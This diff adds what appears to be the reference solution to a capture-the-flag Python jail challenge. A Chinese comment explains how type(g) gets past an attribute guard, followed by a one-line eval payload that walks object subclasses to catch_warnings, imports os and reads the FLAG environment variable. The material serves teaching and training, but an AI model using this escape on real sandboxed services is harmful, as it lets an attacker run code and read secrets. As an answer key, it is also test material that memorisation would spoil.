@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# Guard 的 __getattribute__ 拦截一切 __ 开头属性，
+# 但 type(g) 走类型而非实例属性访问，绕过拦截
+getattr([x for x in type(g).__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os'), 'environ')['FLAG']
